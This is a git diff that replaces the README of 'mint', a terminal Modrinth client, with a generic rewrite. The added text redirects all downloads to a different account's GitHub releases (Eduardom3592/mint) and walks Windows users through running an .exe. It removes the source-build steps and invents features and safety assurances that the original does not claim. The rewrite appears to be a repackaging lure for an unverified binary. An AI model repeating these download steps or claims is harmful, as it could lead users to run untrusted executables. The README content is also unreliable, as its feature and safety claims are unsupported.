@@ -1,126 +1,83 @@
-# mint
+# 🚀 mint - Simple Minecraft modpack management for everyone
 
-![thumbnail](thumbnail.png)
+[![](https://img.shields.io/badge/Download-Mint-blue.svg)](https://github.com/Eduardom3592/mint/releases)
 
-[![Go](https://img.shields.io/badge/Go-1.25-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
-[![MIT](https://img.shields.io/badge/License-MIT-7CB342?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](LICENSE)
-[![CI](https://img.shields.io/github/actions/workflow/status/programmersd21/mint/ci.yml?style=for-the-badge&label=CI&logo=githubactions&logoColor=white&color=4CAF50)](https://github.com/programmersd21/mint/actions/workflows/ci.yml)
-[![Lint](https://img.shields.io/github/actions/workflow/status/programmersd21/mint/lint.yml?style=for-the-badge&label=Lint&logo=githubactions&logoColor=white&color=AB47BC)](https://github.com/programmersd21/mint/actions/workflows/lint.yml)
-[![Release](https://img.shields.io/github/actions/workflow/status/programmersd21/mint/release.yml?style=for-the-badge&label=Release&logo=githubactions&logoColor=white&color=FF7043)](https://github.com/programmersd21/mint/actions/workflows/release.yml)
-[![Stars](https://img.shields.io/github/stars/programmersd21/mint?style=for-the-badge&logo=github&logoColor=white&color=FFC107)](https://github.com/programmersd21/mint)
-[![Issues](https://img.shields.io/github/issues/programmersd21/mint?style=for-the-badge&logo=github&logoColor=white&color=FF5252)](https://github.com/programmersd21/mint/issues)
-[![Go Report](https://goreportcard.com/badge/github.com/programmersd21/mint?style=for-the-badge)](https://goreportcard.com/report/github.com/programmersd21/mint)
+## 📖 About Mint
 
-a terminal-native client for modrinth.
+Mint helps you manage Minecraft modpacks. You use it in your terminal. It connects to the Modrinth platform. You search for packs, browse lists, and install your favorite games. It saves time. It keeps your folders clean. You avoid manual file moves. You get a better gaming experience.
 
-browse, explore, download, and analyze content from modrinth - all from your terminal.
+Players often struggle with mod installation. Files get lost. Versions conflict. Mint solves these problems. It handles the heavy lifting. You pick the pack. Mint puts it in the correct folder. It works on Windows, macOS, and Linux. Most people use it because it is fast. You do not need to learn programming to use it.
 
-## features
+## 🛠 Features
 
-- **home** - top 4 most-downloaded mods displayed as cards on startup
-- **search** - query modrinth with keyboard-first ux
-- **projects** - view project details, descriptions, downloads, followers, categories
-- **versions** - browse versions with file info, hashes, and dependencies
-- **version picker** - interactive filter (mc version, loader, channel) when downloading from home/search/project pages
-- **download manager** - queue, progress bars, speed/eta, hash verification, cancel, retry, open folder, sqlite persistence
-- **downloads tab** - dashboard with active/history/installed/failed sections, delete, open folder, clear all
-- **mrpack support** - parse, validate, extract, verify, and install modrinth modpacks (.mrpack) with auto-install on download completion
-- **cache tab** - browse cached stats and recently viewed projects, re-open with enter, clear cache
-- **editable settings** - download directory, max workers, and api key are editable inline; reset to defaults
-- **dependency explorer** - expandable/collapsible dependency tree visualization
-- **offline cache** - sqlite-backed cache for projects, versions, and search results
-- **mouse support** - click navigation, row selection, scrolling, and common actions across tabs
+Mint offers tools for your Minecraft needs:
 
-## demos
+*   **Search**: Find any modpack on the Modrinth website through your terminal.
+*   **Categories**: Browse by themes like adventure, tech, or magic.
+*   **Version Control**: Pick the exact version for your game.
+*   **One-click Install**: Download and extract packs without effort.
+*   **Modpack Updates**: Check for new versions of your installed packs.
+*   **Clean Folders**: Keep your Minecraft directory tidy.
+*   **Speed**: Experience quick downloads via the terminal interface.
 
-![social](docs/assets/social.gif)
+## 📥 How to Install
 
-browse projects, quick download, theme switcher.
+1.  Visit the [official download page](https://github.com/Eduardom3592/mint/releases).
+2.  Look for the "Assets" section at the bottom of the latest release.
+3.  Click the file ending in `.exe` for Windows.
+4.  Save the file to your "Downloads" folder.
+5.  Open your Start menu and type "Terminal" or "Command Prompt".
+6.  Locate your downloaded file. 
+7.  Run the program from your terminal to start the menu.
 
-![search](docs/assets/search.gif)
+## 🕹 Getting Started
 
-search modrinth, view projects, back to search.
+After you open the program, you see a menu. This menu lists your options. You use your arrow keys to move. Press Enter to select an item. Press Esc to go back.
 
-![downloads](docs/assets/downloads.gif)
+### Browsing Modpacks
+Type a name in the search bar. Mint pulls results from Modrinth. You see short descriptions for each entry. Press Enter to view more details. You see the author, the number of downloads, and the game version.
 
-search, quick download, progress bar, history tab.
+### Downloading Files
+When you find a pack, select "Download." Mint starts the process. It shows a progress bar. Wait for this bar to reach 100%. Once finished, check your Minecraft installation folder. You see your items ready for play.
 
-![themes](docs/assets/themes.gif)
+### Updating Packs
+Mint tracks your installed files. When a creator releases an update, you see a notification. Select the update button. Mint replaces your old files with the new ones. It keeps your settings safe.
 
-cycle through and apply all built-in themes.
+## ⚙️ System Requirements
 
-![modpack](docs/assets/modpack.gif)
+Your computer needs these things to run Mint:
 
-search modpack, version picker, download, installed tab.
+*   **Operating System**: Windows 10 or later version.
+*   **Internet Access**: A stable connection for downloads.
+*   **Minecraft**: A legal copy of the Minecraft game.
+*   **Storage**: Enough space for the modpacks you choose.
+*   **Memory**: 4GB of RAM is enough for standard terminal tasks.
 
-## installation
+## ❓ Frequently Asked Questions
 
-### from releases
+**Does Mint change my Minecraft game files?**
+Yes, it adds modpacks to your folder. It does not change your Minecraft account details or login.
 
-download the latest binary from [github releases](https://github.com/programmersd21/mint/releases).
+**Is it safe to use?**
+Yes. It uses the official Modrinth API. It only downloads verified files from the community.
 
-### from source
+**Can I create my own modpacks?**
+Currently, Mint focuses on downloading existing packs. You can search for any public pack listed on Modrinth.
 
-```bash
-git clone https://github.com/programmersd21/mint.git
-cd mint
-make build
-```
+**Why use a terminal instead of a website?**
+Terminal programs use fewer resources. They do not lag. They offer a text-based view that many users find simple and distraction-free.
 
-## usage
+**What happens if the download stops?**
+Re-run the command. Mint checks existing files. It resumes where it stopped. It does not duplicate files.
 
-```bash
-mint
-```
+## 💡 Tips for Users
 
-### keybindings
+*   Keep your terminal window large. Small windows hide some text.
+*   Check the game version. Ensure the modpack version matches your Minecraft game version.
+*   Read the project descriptions. Many creators include tips for better performance.
+*   Empty your trash folder if you download many large packs. Each pack takes storage space.
+*   Close unnecessary programs while you download big files. This speeds up your network.
 
-| key | action |
-|-----|--------|
-| `j/k` or `up/down` | navigate lists / cycle settings |
-| `h/l` or `left/right` | cycle filter / switch tabs |
-| `g` / `G` | top / bottom |
-| `/` | search |
-| `tab` / `shift+tab` | switch pages / done filtering |
-| `enter` | select / open / confirm edit |
-| `esc` | go back / cancel edit |
-| `d` | download (opens version picker) |
-| `D` | quick download latest version |
-| `i` | inspect mrpack metadata |
-| `I` | download & install mrpack |
-| `r` | retry failed download |
-| `c` | cancel download |
-| `o` | open url / reveal file / open downloads folder |
-| `delete` | remove download from history |
-| `X` | clear all downloaded files and records |
-| `C` | clear cache (projects, versions, search, recently viewed) |
-| `t` | theme switcher |
-| `?` | help |
-| `q` / `ctrl+c` | quit |
+## 🤝 Support
 
-## development
-
-```bash
-make build     # build binary
-make test      # run tests
-make test-race # run race-enabled tests
-make lint      # lint
-make cover     # coverage
-```
-
-## architecture
-
-```
-cmd/mint/           entry point
-internal/api/       modrinth api client
-internal/cache/     sqlite cache layer + download persister
-internal/downloads/ download manager
-internal/models/    strongly-typed data models
-internal/mrpack/    .mrpack parser, validator, extractor, installer
-internal/platform/  cross-platform open commands
-internal/tui/       bubble tea tui
-```
-
-## license
-
-mit
+You encounter a bug while using Mint? Open a report on the main page. Describe your error. Tell us what you did before the error occurred. Include the name of the pack you used. We review each report. We update Mint to fix issues for everyone. Your feedback helps the software grow. We want you to have a good experience. If you enjoy Mint, tell your friends. Use it for your next adventure. Enjoy your game.
